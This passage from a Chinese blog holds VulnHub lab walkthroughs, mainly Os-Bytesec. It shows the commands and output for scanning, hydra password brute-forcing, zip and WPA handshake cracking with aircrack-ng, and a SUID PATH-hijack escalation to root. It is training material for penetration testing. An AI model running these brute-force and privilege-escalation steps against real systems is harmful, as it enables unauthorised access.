/>一番尝试后发现账户密码同Basic认证的密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">su recon</span><br><span class="line">Security@hackNos</span><br><span class="line">sudo su</span><br><span class="line">Security@hackNos</span><br><span class="line">id</span><br><span class="line">    uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure><hr /><blockquote><p>如何找到靶机的IP?</p></blockquote><p>这个问题曾经让我头疼过一阵子<br />看着网上的WP，有些是使用<code>netdiscover</code>，但是个人倾向于将靶机与Kali的网络配置成桥接模式，即使<code>netdiscover</code>发现了靶机，也没有一个明显地特征可以在当前网段的众多机器中去区分<br />个人的话倒是会去看路由器的后台，然后看看本机上的多个IP<br />而Nmap在扫描靶机时，可以报告其MAC地址与相关厂商，而一般的靶机都会在80端口开放WEB服务，那么就可以扫描80端口，再配合上grep来节选出靶机<br /><code>nmap -p 80 -Pn -v -T5 192.168.31.0/24 | grep -B 6 virtual</code></p><blockquote><p>Web log</p></blockquote><p>在尝试命令执行的时候我也尝试了使用curl命令来进行数据外传，但是发现自己找不到Web服务的log文件，只好用find命令配合grep找，中间也稍微学习了一下grep的正则用法<br /><code>find /* -iname &quot;*.log&quot; | grep -E &quot;(apache|nginx)&quot;</code><br />大概是这个样子</p><p>参考资料</p><blockquote><p><a href="https://blog.csdn.net/qq_38526635/article/etails/82147980">FTP</a><br /><a href="https://blog.csdn.net/weixin_44214107/article/details/104056796">WP</a><br /><a href="https://blog.csdn.net/weixin_43754984/article/details/84328313">grep&amp;RE</a></p></blockquote><hr /><h1 id="os-bytesec"><a class="markdownIt-Anchor" href="#os-bytesec"></a> <a href="https://www.vulnhub.com/entry/hacknos-os-bytesec,393/">Os-Bytesec</a></h1><p><code>2020/02/15 16:50:01</code></p><h2 id="端口扫描-5"><a class="markdownIt-Anchor" href="#端口扫描-5"></a> 端口扫描</h2><p><code>nmap -p- -Pn -sV -n -T5 -v -A 192.168.31.185</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.185</span><br><span class="line">Host is up (0.0012s latency).</span><br><span class="line">Not shown: 65531 closed ports</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">80&#x2F;tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-favicon: Unknown favicon MD5: 5ECF6AFD7D00CCBE6B3C7AA8FD31BDE8</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: OPTIONS GET HEAD POST</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Hacker_James</span><br><span class="line">139&#x2F;tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445&#x2F;tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)</span><br><span class="line">2525&#x2F;tcp open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 12:55:4f:1e:e9:7e:ea:87:69:90:1c:1f:b0:63:3f:f3 (RSA)</span><br><span class="line">|   256 a6:70:f1:0e:df:4e:73:7d:71:42:d6:44:f1:2f:24:d2 (ECDSA)</span><br><span class="line">|_  256 f0:f8:fd:24:65:07:34:c2:d4:9a:1f:c0:b8:2e:d8:3a (ED25519)</span><br><span class="line">MAC Address: 08:00:27:55:0A:C2 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Uptime guess: 0.281 days (since Fri Feb 14 21:05:09 2020)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty&#x3D;264 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: Host: NITIN; OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: -18h25m11s, deviation: 3h10m31s, median: -16h35m11s</span><br><span class="line">| nbstat: NetBIOS name: NITIN, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| Names:</span><br><span class="line">|   NITIN&lt;00&gt;            Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|   NITIN&lt;03&gt;            Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|   NITIN&lt;20&gt;            Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|   \x01\x02__MSBROWSE__\x02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;</span><br><span class="line">|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;</span><br><span class="line">|   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|_  WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)</span><br><span class="line">|   Computer name: nitin</span><br><span class="line">|   NetBIOS computer name: NITIN\x00</span><br><span class="line">|   Domain name: 168.1.7</span><br><span class="line">|   FQDN: nitin.168.1.7</span><br><span class="line">|_  System time: 2020-02-14T21:43:57+05:30</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2020-02-14 11:13:57</span><br><span class="line">|_  start_date: N&#x2F;A</span><br></pre></td></tr></table></figure><h2 id="web路径枚举-5"><a class="markdownIt-Anchor" href="#web路径枚举-5"></a> Web路径枚举</h2><p><code>dirb http://192.168.31.185/ -w</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.31.185&#x2F; ----</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.185&#x2F;css&#x2F;                                          </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.185&#x2F;gallery&#x2F;                                      </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.185&#x2F;html&#x2F;                                         </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.185&#x2F;img&#x2F;                                          </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.185&#x2F;index.html (CODE:200|SIZE:3086)                            </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.185&#x2F;js&#x2F;                                           </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.185&#x2F;news&#x2F;                                         </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.185&#x2F;server-status (CODE:403|SIZE:279)</span><br></pre></td></tr></table></figure><p>在<code>index.html</code>页面的底端获取一段字符串<br /><code>####################GET#####smb##############free</code></p><p>在图片<code>/img/news.png</code>中获取信息<code>BlueKeep Attacks</code></p><blockquote><p>BlueKeep是Windows上RDP服务上的漏洞(CVE-2019-0708)，目测与本靶机关联并不大。</p></blockquote><h2 id="漏洞利用-5"><a class="markdownIt-Anchor" href="#漏洞利用-5"></a> 漏洞利用</h2><p><code>enum4linux 192.168.31.185</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">S-1-22-1-1000 Unix User\sagar (Local User)</span><br><span class="line">S-1-22-1-1001 Unix User\blackjax (Local User)</span><br><span class="line">S-1-22-1-1002 Unix User\smb (Local User)</span><br></pre></td></tr></table></figure><p>获得三个账户名</p><p>使用smbmap进行测试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 192.168.31.185</span><br><span class="line">[+] Finding open SMB ports....</span><br><span class="line">[+] Guest SMB session established on 192.168.31.185...</span><br><span class="line">[+] IP: 192.168.31.185:445Name: 192.168.31.185                                    </span><br><span class="line">Disk                                                  Permissions</span><br><span class="line">----                                                  -----------</span><br><span class="line">print$                                            NO ACCESS</span><br><span class="line">IPC$                                              NO ACCESS</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 192.168.31.185 -u smb</span><br><span class="line">[+] Finding open SMB ports....</span><br><span class="line">[+] User SMB session establishd on 192.168.31.185...</span><br><span class="line">[+] IP: 192.168.31.185:445Name: 192.168.31.185                                    </span><br><span class="line">Disk                                                  Permissions</span><br><span class="line">----                                                  -----------</span><br><span class="line">print$                                            READ ONLY</span><br><span class="line">IPC$                                              NO ACCESS</span><br></pre></td></tr></table></figure><p>账户smb可以登入SMB服务</p><p>使用hydra爆破SMB服务中SMB账户的密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hydra -I -l smb -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -e n smb:&#x2F;&#x2F;192.168.31.185</span><br><span class="line"></span><br><span class="line">[DATA] attacking smb:&#x2F;&#x2F;192.168.31.185:445&#x2F;</span><br><span class="line">[445][smb] host: 192.168.31.185   login: smb</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br></pre></td></tr></table></figure><p>密码为空</p><p>登入SMB服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">smbclient &#x2F;&#x2F;192.168.31.185&#x2F;smb -U smb</span><br><span class="line"></span><br><span class="line">ls</span><br><span class="line">    .                                   D        0  Mon Nov  4 06:50:37 2019</span><br><span class="line">    ..                                  D        0  Mon Nov  4 06:37:28 2019</span><br><span class="line">    main.txt                            N       10  Mon Nov  4 06:45:38 2019</span><br><span class="line">    safe.zip                            N  3424907  Mon Nov  4 06:50:37 2019</span><br><span class="line">    </span><br><span class="line">                9204224 blocks of size 1024. 6824568 blocks available</span><br></pre></td></tr></table></figure><p>下载文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get main.txt</span><br><span class="line">get safe.zip</span><br></pre></td></tr></table></figure><p><code>main.txt</code>中没有有效信息<br /><code>safe.zip</code>被加密<br />使用<code>fcrackzip</code>进行爆破</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip -u -D -p &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt safe.zip</span><br><span class="line"></span><br><span class="line">    PASSWORD FOUND!!!!: pw &#x3D;&#x3D; hacker1</span><br></pre></td></tr></table></figure><p>解压压缩包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unzip safe.zip</span><br><span class="line">hacker1</span><br></pre></td></tr></table></figure><p>得到两个文件</p><ul><li><code>secret.jpg</code> 有文字–“AFTER THE WALKOUT”，暂时不考虑图片隐写等其他因素</li><li><code>user.cap</code> WireShare打开之后是IEEE 802.11协议(WIFI)的流量包，可能存在握手包</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt user.cap</span><br><span class="line"></span><br><span class="line">Opening user.cap please wait...</span><br><span class="line">Read 49683 packets.</span><br><span class="line"></span><br><span class="line">   #  BSSID              ESSID                     Encryption</span><br><span class="line"></span><br><span class="line">   1  56:DC:1D:19:52:BC  blackjax                  WPA (1 handshake)</span><br><span class="line"></span><br><span class="line">Choosing first network as target.</span><br><span class="line"></span><br><span class="line">Opening user.cap please wait...</span><br><span class="line">Read 49683 packets.</span><br><span class="line"></span><br><span class="line">1 potential targets</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                              Aircrack-ng 1.5.2 </span><br><span class="line"></span><br><span class="line">      [00:00:07] 21280&#x2F;7120712 keys tested (2885.36 k&#x2F;s) </span><br><span class="line"></span><br><span class="line">      Time left: 41 minutes, 0 seconds                           0.30%</span><br><span class="line"></span><br><span class="line">                           KEY FOUND! [ snowflake ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      Master Key     : 80 0A BE 28 5A 50 78 10 7E E2 85 A8 E8 D0 41 3C </span><br><span class="line">                       5E CB 18 C2 40 05 D7 7F E1 12 E6 B4 C6 D8 F4 E5 </span><br><span class="line"></span><br><span class="line">      Transient Key  : C8 9D B1 E2 76 82 F3 90 AC 53 CB 02 8F D0 73 FB </span><br><span class="line">                       47 92 63 63 56 97 1C 19 36 BD FD B4 D5 6D 65 35 </span><br><span class="line">                       48 1B D3 06 57 40 4D 77 9D BD 26 30 1B B3 06 AF </span><br><span class="line">                       1B FA 37 7E E8 9C 17 07 BE 63 DD C0 11 D4 88 21 </span><br><span class="line"></span><br><span class="line">      EAPOL HMAC     : 68 98 0E 18 F9 DA 55 3B 4B BC EA 35 37 CC 25 2F</span><br></pre></td></tr></table></figure><p>SSID为<code>blackjax</code>，密码为<code>snowflake</code></p><p>在WireShark中调试<br />Preference -&gt; Protocols -&gt; IEEE 802.11-&gt; Decryption keys -&gt; Edit<br />添加Key记录<br /><code>wpa-pwd|snowflake:blackjax</code><br />流量包中未找到其他有效信息</p><p>尝试枚举SSH账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot;smb\nblackjax\nsagar\nroot\nadmin\nhelo\nsnowflake&quot; &gt; test</span><br><span class="line">hydra -I -L test -P test -e ns -u ssh:&#x2F;&#x2F;192.168.31.185 -s 2525</span><br><span class="line">    [2525][ssh] host: 192.168.31.185   login: blackjax   password: snowflake</span><br></pre></td></tr></table></figure><p>获取账户blackjax</p><h2 id="权限提升-5"><a class="markdownIt-Anchor" href="#权限提升-5"></a> 权限提升</h2><p>登入SSH服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh blackjax@192.168.31.185 -p 2525</span><br><span class="line">snowflake</span><br><span class="line">&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><p>尝试SUID提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;policykit-1&#x2F;polkit-agent-helper-1</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;snapd&#x2F;snap-confine</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;i386-linux-gnu&#x2F;lxc&#x2F;lxc-user-nic</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newgidmap</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;gpasswd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newuidmap</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chfn</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;passwd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chsh</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;pkexec</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newgrp</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;netscan</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;sudo</span><br><span class="line">&#x2F;bin&#x2F;ping6</span><br><span class="line">&#x2F;bin&#x2F;fusermount</span><br><span class="line">&#x2F;bin&#x2F;mount</span><br><span class="line">&#x2F;bin&#x2F;su</span><br><span class="line">&#x2F;bin&#x2F;ping</span><br><span class="line">&#x2F;bin&#x2F;umount</span><br><span class="line">&#x2F;bin&#x2F;ntfs-3g</span><br></pre></td></tr></table></figure><p><code>/usr/bin/netscan</code>有些异常</p><p>使用<code>strings</code>命令分析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">strings &#x2F;usr&#x2F;bin&#x2F;netscan </span><br><span class="line"></span><br><span class="line">&#x2F;lib&#x2F;ld-linux.so.2</span><br><span class="line">libc.so.6</span><br><span class="line">_IO_stdin_used</span><br><span class="line">setuid</span><br><span class="line">system</span><br><span class="line">setgid</span><br><span class="line">__libc_start_main</span><br><span class="line">__gmon_start__</span><br><span class="line">GLIBC_2.0</span><br><span class="line">PTRh</span><br><span class="line">QVhk</span><br><span class="line">UWVS</span><br><span class="line">t$,U</span><br><span class="line">[^_]</span><br><span class="line">netstat -antp</span><br><span class="line">;*2$&quot;(</span><br><span class="line">GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609</span><br><span class="line">crtstuff.c</span><br><span class="line">__JCR_LIST__</span><br><span class="line">deregister_tm_clones</span><br><span class="line">__do_global_dtors_aux</span><br><span class="line">completed.7209</span><br><span class="line">__do_global_dtors_aux_fini_array_entry</span><br><span class="line">frame_dummy</span><br><span class="line">__frame_dummy_init_array_entry</span><br><span class="line">pingshell.c</span><br><span class="line">__FRAME_END__</span><br><span class="line">__JCR_END__</span><br><span class="line">__init_array_end</span><br><span class="line">_DYNAMIC</span><br><span class="line">__init_array_start</span><br><span class="line">__GNU_EH_FRAME_HDR</span><br><span class="line">_GLOBAL_OFFSET_TABLE_</span><br><span class="line">__libc_csu_fini</span><br><span class="line">_ITM_deregisterTMCloneTable</span><br><span class="line">__x86.get_pc_thunk.bx</span><br><span class="line">_edata</span><br><span class="line">__data_start</span><br><span class="line">setgid@@GLIBC_2.0</span><br><span class="line">system@@GLIBC_2.0</span><br><span class="line">__gmon_start__</span><br><span class="line">__dso_handle</span><br><span class="line">_IO_stdin_used</span><br><span class="line">__libc_start_main@@GLIBC_2.0</span><br><span class="line">__libc_csu_init</span><br><span class="line">_fp_hw</span><br><span class="line">__bss_start</span><br><span class="line">main</span><br><span class="line">setuid@@GLIBC_2.0</span><br><span class="line">_Jv_RegisterClasses</span><br><span class="line">__TMC_END__</span><br><span class="line">_ITM_registerTMCloneTable</span><br><span class="line">.symtab</span><br><span class="line">.strtab</span><br><span class="line">.shstrtab</span><br><span class="line">.interp</span><br><span class="line">.note.ABI-tag</span><br><span class="line">.note.gnu.build-id</span><br><span class="line">.gnu.hash</span><br><span class="line">.dynsym</span><br><span class="line">.dynstr</span><br><span class="line">.gnu.version</span><br><span class="line">.gnu.version_r</span><br><span class="line">.rel.dyn</span><br><span class="line">.rel.plt</span><br><span class="line">.init</span><br><span class="line">.plt.got</span><br><span class="line">.text</span><br><span class="line">.fini</span><br><span class="line">.rodata</span><br><span class="line">.eh_frame_hdr</span><br><span class="line">.eh_frame</span><br><span class="line">.init_array</span><br><span class="line">.fini_array</span><br><span class="line">.jcr</span><br><span class="line">.dynamic</span><br><span class="line">.got.plt</span><br><span class="line">.data</span><br><span class="line">.bss</span><br><span class="line">.comment</span><br></pre></td></tr></table></figure><p>可以看到<code>netstat -antp</code><br />猜想这个二进制文件是在执行netstat命令<br />则可以进行PATH提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">echo &quot;&#x2F;bin&#x2F;bash&quot; &gt;netstat</span><br><span class="line">chmod 777 netstat</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH&#x3D;&#x2F;tmp:$PATH</span><br><span class="line">cd &#x2F;usr&#x2F;bin</span><br><span class="line">.&#x2F;netscan</span><br><span class="line">id</span><br><span class="line">    uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root),1001(blackjax)</span><br></pre></td></tr></table></figure><hr /><blockquote><p>PATH提权</p></blockquote><ul><li>目标文件为二进制可执行文件</li><li>需要知道目标文件所执行的命令</li><li>strings查看可执行文件内容</li></ul><p>参考资料</p><blockquote><p><a href="https://www.moonsec.com/archives/709">WP</a><br /><a href="https://www.freebuf.com/articles/system/221949.html">WP</a><br /><a href="https://www.xuebuyuan.com/3235974.html">SMB</a><br /><a href="https://www.anquanke.com/post/id/146799">PATH提权</a></p></blockquote><hr /><h1 id="bulldog"><a class="markdownIt-Anchor" href="#bulldog"></a> <a href="https://www.vulnhub.com/entry/bulldog-1,211/">bulldog</a></h1><p><code>2020/02/17 19:06:44</code></p><h2 id="端口扫描-6"><a class="markdownIt-Anchor" href="#端口扫描-6"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -T5 -n -v -A 192.168.31.121</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.121</span><br><span class="line">Host is up (0.0011s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">23&#x2F;tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 20:8b:fc:9e:d9:2e:28:22:6b:2e:0e:e3:72:c5:bb:52 (RSA)</span><br><span class="line">|   256 cd:bd:45:d8:5c:e4:8c:b6:91:e5:39:a9:66:cb:d7:98 (ECDSA)</span><br><span class="line">|_  256 2f:ba:d5:e5:9f:a2:43:e5:3b:24:2c:10:c2:0a:da:66 (ED25519)</span><br><span class="line">80&#x2F;tcp   open  http    WSGIServer 0.1 (Python 2.7.12)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD OPTIONS</span><br><span class="line">|_http-server-header: WSGIServer&#x2F;0.1 Python&#x2F;2.7.12</span><br><span class="line">|_http-title: Bulldog Industries</span><br><span class="line">8080&#x2F;tcp open  http    WSGIServer 0.1 (Python 2.7.12)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD OPTIONS</span><br><span class="line">|_http-server-header: WSGIServer&#x2F;0.1 Python&#x2F;2.7.12</span><br><span class="line">|_http-title: Bulldog Industries</span><br><span class="line">MAC Address: 08:00:27:33:65:D8 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:&#x2F;o:linux:linux_kernel:3 